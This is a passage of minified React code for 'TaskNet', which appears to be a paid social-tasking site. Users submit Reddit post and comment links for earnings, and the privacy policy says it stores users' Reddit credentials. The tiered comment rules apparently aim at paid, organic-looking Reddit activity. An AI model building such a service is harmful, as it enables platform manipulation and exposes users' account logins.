font-black text-blue-500 uppercase tracking-widest",children:"Step 2"}),s.jsx("div",{className:"h-[1px] w-12 bg-white/10"}),s.jsx("span",{className:"text-xs font-bold text-gray-500 italic",children:"Participation"})]}),s.jsx("h3",{className:"text-xl font-bold text-white mb-2",children:"Complete the Task"}),s.jsx("div",{className:"p-4 bg-white/[0.03] border border-white/5 rounded-2xl text-sm text-gray-400 leading-relaxed mb-6 whitespace-pre-line max-w-lg",children:n.instructions}),s.jsxs("div",{className:"space-y-6 max-w-lg",children:[s.jsxs("div",{children:[s.jsx("label",{className:"block text-[10px] font-black text-gray-600 uppercase tracking-widest mb-3 ml-1",children:"Main Task Submission Link"}),s.jsxs("div",{className:"relative group",children:[s.jsx(ul,{className:"absolute left-4 top-1/2 -translate-y-1/2 text-gray-600 group-focus-within:text-blue-500 transition-colors",size:16}),s.jsx("input",{type:"url",placeholder:"https://www.reddit.com/r/...",value:v,onChange:de=>k(de.target.value),className:"w-full pl-12 pr-4 py-4 bg-[#0a0a0a] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-sm outline-none shadow-inner"})]})]}),n.tier==="Tier 3"&&s.jsxs("div",{className:"space-y-4 animate-in fade-in slide-in-from-bottom-4 duration-500",children:[s.jsx("label",{className:"block text-[10px] font-black text-gray-600 uppercase tracking-widest mb-3 ml-1",children:"Random Comments (Must be unique subreddits)"}),_.map((de,ae)=>s.jsxs("div",{className:"relative group",children:[s.jsx("div",{className:"absolute left-4 top-1/2 -translate-y-1/2 text-xs font-black text-gray-700 group-focus-within:text-blue-500 transition-colors w-4",children:ae+1}),s.jsx("input",{type:"url",placeholder:`Random comment link ${ae+1}...`,value:de,onChange:we=>{const he=[..._];he[ae]=we.target.value,S(he)},className:"w-full pl-12 pr-4 py-3.5 bg-[#0a0a0a] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-xs outline-none shadow-inner"})]},ae))]}),s.jsxs("div",{className:"pt-4",children:[s.jsxs("div",{className:"flex items-center gap-3 p-4 bg-orange-500/5 border border-orange-500/10 rounded-2xl mb-4",children:[s.jsx(at,{size:16,className:"text-orange-500 shrink-0"}),s.jsx("p",{className:"text-[10px] font-bold text-orange-500/80 uppercase tracking-wider",children:"Please double check before submitting the link"})]}),n.status==="claimed"?s.jsx("button",{onClick:Fe,disabled:h,className:"w-full py-4 bg-blue-600 text-white rounded-2xl font-black text-sm hover:bg-blue-700 transition-all shadow-xl shadow-blue-600/20 flex items-center justify-center gap-2 group disabled:opacity-50",children:h?"Submitting...":s.jsxs(s.Fragment,{children:["Submit Completed Task",s.jsx(Vn,{size:18,className:"group-hover:translate-x-1 group-hover:-translate-y-1 transition-transform"})]})}):s.jsx("div",{className:"p-4 bg-white/[0.03] border border-white/5 rounded-2xl text-center",children:s.jsxs("span",{className:"text-xs font-bold text-gray-500 uppercase tracking-widest",children:["Submission Locked (",n.status.toUpperCase(),")"]})})]})]})]})]})]})]}),s.jsx("div",{className:"lg:col-span-1",children:s.jsxs("div",{className:"sticky top-28 space-y-6",children:[s.jsxs("div",{className:"p-8 bg-white/[0.02] border border-white/5 rounded-[32px] animate-in fade-in slide-in-from-right-4 duration-700",children:[s.jsxs("div",{className:"flex items-center gap-4 mb-6",children:[s.jsx("div",{className:"w-12 h-12 bg-red-500/10 rounded-2xl flex items-center justify-center border border-red-500/20",children:s.jsx(at,{className:"text-red-500",size:24})}),s.jsxs("div",{children:[s.jsx("h3",{className:"text-sm font-black uppercase tracking-wider text-white",children:"Report Problem"}),s.jsx("p",{className:"text-[10px] font-bold text-gray-500 uppercase tracking-widest",children:"Contact Administration"})]})]}),s.jsxs("div",{className:"space-y-4",children:[s.jsx("p",{className:"text-xs text-gray-500 leading-relaxed italic",children:"Disclaimer: Reporting fake issues or spamming this box will lead to a temporary account suspension."}),s.jsx("textarea",{rows:4,placeholder:"Note down your problem here...",value:T,onChange:de=>D(de.target.value),className:"w-full px-5 py-4 bg-black/40 border border-white/5 rounded-2xl focus:outline-none focus:border-red-500/50 transition-all text-xs placeholder:text-gray-600 resize-none outline-none"}),s.jsxs("button",{onClick:ze,disabled:!T.trim()||z,className:"w-full py-4 bg-white/[0.03] border border-white/10 text-gray-400 rounded-2xl font-bold text-xs hover:text-white hover:bg-white/5 transition-all flex items-center justify-center gap-2 group disabled:opacity-50",children:[z?"Sending...":"Send Report",!z&&s.jsx(Vn,{size:14,className:"group-hover:translate-x-0.5 group-hover:-translate-y-0.5 transition-transform"})]})]})]}),s.jsxs("div",{className:"p-6 bg-blue-600/5 border border-blue-600/10 rounded-[32px] text-center",children:[s.jsx("p",{className:"text-[10px] font-black text-blue-500/60 uppercase tracking-[0.2em] mb-2",children:"Need Live Support?"}),s.jsx("a",{href:"https://discord.gg/ND296AgTyc",target:"_blank",rel:"noreferrer",className:"text-xs font-bold text-white hover:text-blue-400 transition-colors",children:"Join our Discord Community"})]})]})})]})]}),H&&s.jsx("div",{className:"fixed inset-0 z-[200] flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-300",children:s.jsxs("div",{className:"w-full max-w-md bg-[#0a0a0a] border border-white/10 rounded-[40px] p-8 sm:p-10 shadow-2xl animate-in zoom-in duration-300",children:[s.jsxs("div",{className:"flex flex-col items-center text-center mb-8",children:[s.jsx("div",{className:"w-16 h-16 bg-blue-600/10 rounded-2xl flex items-center justify-center mb-6 border border-blue-500/20",children:s.jsx(Ds,{className:"text-blue-500",size:32})}),s.jsx("h2",{className:"text-2xl font-black tracking-tight mb-2 uppercase italic",children:"Confirm Submission"}),s.jsx("p",{className:"text-gray-500 text-sm",children:"Do you want to proceed with the task submission? This action cannot be undone."})]}),s.jsxs("div",{className:"flex gap-4",children:[s.jsx("button",{onClick:()=>te(!1),className:"flex-1 py-4 bg-white/[0.03] border border-white/10 text-gray-400 rounded-2xl font-bold text-sm hover:text-white hover:bg-white/5 transition-all",children:"No, Back"}),s.jsx("button",{onClick:Re,className:"flex-1 py-4 bg-blue-600 text-white rounded-2xl font-black text-sm hover:bg-blue-700 transition-all shadow-lg shadow-blue-600/20 active:scale-[0.98]",children:"Yes, Submit"})]})]})})]})}):s.jsx("div",{className:"min-h-screen bg-black flex items-center justify-center text-red-500 font-bold",children:"Task not found."})},iv=()=>{const a=ur();return s.jsx("div",{className:"min-h-screen bg-black text-white p-6 sm:p-12",children:s.jsxs("div",{className:"max-w-4xl mx-auto",children:[s.jsxs("button",{onClick:()=>a(-1),className:"flex items-center gap-2 text-gray-500 hover:text-white transition-all mb-12 group",children:[s.jsx(fl,{size:20,className:"group-hover:-translate-x-1 transition-transform"}),s.jsx("span",{className:"font-bold uppercase tracking-widest text-xs",children:"Go Back"})]}),s.jsxs("div",{className:"space-y-12",children:[s.jsxs("header",{className:"space-y-4",children:[s.jsx("h1",{className:"text-4xl sm:text-6xl font-black tracking-tighter",children:"PRIVACY POLICY"}),s.jsx("p",{className:"text-gray-500 font-medium",children:"Last Updated: January 21, 2026"})]}),s.jsxs("section",{className:"grid grid-cols-1 md:grid-cols-2 gap-8",children:[s.jsxs("div",{className:"p-8 bg-white/[0.03] border border-white/10 rounded-[32px] space-y-4",children:[s.jsx("div",{className:"w-12 h-12 bg-blue-600/20 rounded-2xl flex items-center justify-center text-blue-500",children:s.jsx(Sc,{size:24})}),s.jsx("h3",{className:"text-xl font-bold",children:"Data Protection"}),s.jsx("p",{className:"text-gray-400 text-sm leading-relaxed",children:"We take your data security seriously. All personal information and Reddit credentials are encrypted and stored securely within our infrastructure."})]}),s.jsxs("div",{className:"p-8 bg-white/[0.03] border border-white/10 rounded-[32px] space-y-4",children:[s.jsx("div",{className:"w-12 h-12 bg-purple-600/20 rounded-2xl flex items-center justify-center text-purple-500",children:s.jsx(Nr,{size:24})}),s.jsx("h3",{className:"text-xl font-bold",children:"Authentication"}),s.jsx("p",{className:"text-gray-400 text-sm leading-relaxed",children:"TaskNet uses secure authentication protocols. Your passwords and login details are never shared with third parties or stored in plain text."})]})]}),s.jsxs("div",{className:"space-y-8 text-gray-400 leading-relaxed",children:[s.jsxs("div",{className:"space-y-4",children:[s.jsxs("h2",{className:"text-2xl font-bold text-white flex items-center gap-3",children:[s.jsx(Hc,{className:"text-blue-500"})," Information We Collect"]}),s.jsx("p",{children:"To provide our services, we collect minimal necessary information: email addresses for account management, Reddit usernames for task verification, and payout details for earnings distribution."})]}),s.jsxs("div",{className:"space-y-4",children:[s.jsxs("h2",{className:"text-2xl font-bold text-white flex items-center gap-3",children:[s.jsx(Nc,{className:"text-blue-500"})," How We Use Data"]}),s.jsx("p",{children:"Your data is used exclusively for:"}),s.jsxs("ul",{className:"list-disc pl-6 space-y-2",children:[s.jsx("li",{children:"Verifying task completion on social platforms."}),s.jsx("li",{children:"Processing withdrawal requests and tracking earnings."}),s.jsx("li",{children:"Sending important administrative alerts regarding your account."}),s.jsx("li",{children:"Preventing fraud and maintaining network integrity."})]})]})]}),s.jsx("footer",{className:"pt-12 border-t border-white/5",children:s.jsx("p",{className:"text-center text-gray-600 text-xs font-bold uppercase tracking-[0.2em]",children:" 2026 TASKNET NETWORK  ALL RIGHTS RESERVED"})})]})]})})},lv=()=>{const a=ur();return s.jsx("div",{className:"min-h-screen bg-black text-white p-6 sm:p-12",children:s.jsxs("div",{className:"max-w-4xl mx-auto",children:[s.jsxs("button",{onClick:()=>a(-1),className:"flex items-center gap-2 text-gray-500 hover:text-white transition-all mb-12 group",children:[s.jsx(fl,{size:20,className:"group-hover:-translate-x-1 transition-transform"}),s.jsx("span",{className:"font-bold uppercase tracking-widest text-xs",children:"Go Back"})]}),s.jsxs("div",{className:"space-y-12",children:[s.jsxs("header",{className:"space-y-4",children:[s.jsx("h1",{className:"text-4xl sm:text-6xl font-black tracking-tighter uppercase",children:"TERMS & CONDITIONS"}),s.jsx("p",{className:"text-gray-500 font-medium",children:"Effective Date: January 21, 2026"})]}),s.jsxs("section",{className:"grid grid-cols-1 md:grid-cols-2 gap-8",children:[s.jsxs("div",{className:"p-8 bg-white/[0.03] border border-white/10 rounded-[32px] space-y-4",children:[s.jsx("div",{className:"w-12 h-12 bg-emerald-600/20 rounded-2xl flex items-center justify-center text-emerald-500",children:s.jsx(tx,{size:24})}),s.jsx("h3",{className:"text-xl font-bold",children:"User Eligibility"}),s.jsx("p",{className:"text-gray-400 text-sm leading-relaxed",children:"You must be at least 13 years old or the legal age of majority in your jurisdiction to use TaskNet and participate in social tasking."})]}),s.jsxs("div",{className:"p-8 bg-white/[0.03] border border-white/10 rounded-[32px] space-y-4",children:[s.jsx("div",{className:"w-12 h-12 bg-amber-600/20 rounded-2xl flex items-center justify-center text-amber-500",children:s.jsx(Z0,{size:24})}),s.jsx("h3",{className:"text-xl font-bold",children:"Prohibited Conduct"}),s.jsx("p",{className:"text-gray-400 text-sm leading-relaxed",children:"Fraudulent activity, multi-accounting, and botting are strictly prohibited. Violators will face permanent network bans and forfeiture of earnings."})]})]}),s.jsxs("div",{className:"space-y-8 text-gray-400 leading-relaxed",children:[s.jsxs("div",{className:"space-y-4",children:[s.jsxs("h2",{className:"text-2xl font-bold text-white flex items-center gap-3",children:[s.jsx(ox,{className:"text-blue-500"})," Service Agreement"]}),s.jsx("p",{children:"By accessing TaskNet, you agree to comply with our network rules and verification processes. We provide a platform connecting task posters with participants but do not guarantee specific earning amounts."})]}),s.jsxs("div",{className:"space-y-4",children:[s.jsxs("h2",{className:"text-2xl font-bold text-white flex items-center gap-3",children:[s.jsx(rx,{className:"text-blue-500"})," Withdrawal Policy"]}),s.jsx("p",{children:"Earnings are distributed after verification. Processing times vary by payout method. We reserve the right to audit accounts before finalizing large withdrawals to ensure compliance."})]})]}),s.jsx("footer",{className:"pt-12 border-t border-white/5",children:s.jsx("p",{className:"text-center text-gray-600 text-xs font-bold uppercase tracking-[0.2em]",children:" 2026 TASKNET NETWORK  TERMS OF SERVICE"})})]})]})})},$a=({children:a})=>{const r=Zt("user_email")||localStorage.getItem("user_email");return r&&Vy("user_email"),r?s.jsx(s.Fragment,{children:a}):s.jsx(qc,{to:"/welcome",replace:!0})};function ov(){return s.jsx(q0,{children:s.jsxs(D0,{children:[s.jsx(Mt,{path:"/welcome",element:s.jsx(Hy,{})}),s.jsx(Mt,{path:"/login",element:s.jsx(Zy,{})}),s.jsx(Mt,{path:"/reddit-login",element:s.jsx(ev,{})}),s.jsx(Mt,{path:"/privacy",element:s.jsx(iv,{})}),s.jsx(Mt,{path:"/terms",element:s.jsx(lv,{})}),s.jsx(Mt,{path:"/adminpanel_1",element:s.jsx(rv,{})}),s.jsx(Mt,{path:"/adminpanel_2",element:s.jsx(nv,{})}),s.jsx(Mt,{path:"/",element:s.jsx($a,{children:s.jsx(Jy,{})})}),s.jsx(Mt,{path:"/tasks",element:s.jsx($a,{children:s.jsx(Yy,{})})}),s.jsx(Mt,{path:"/task/:id",element:s.jsx($a,{children:s.jsx(av,{})})}),s.jsx(Mt,{path:"/withdraw",element:s.jsx($a,{children:s.jsx(Qy,{})})}),s.jsx(Mt,{path:"/account",element:s.jsx($a,{children:s.jsx(Xy,{})})}),s.jsx(Mt,{path:"*",element:s.jsx(qc,{to:"/",replace:!0})})]})})}Vm.createRoot(document.getElementById("root")).render(s.jsx(Mc.StrictMode,{children:s.jsx(ov,{})}));
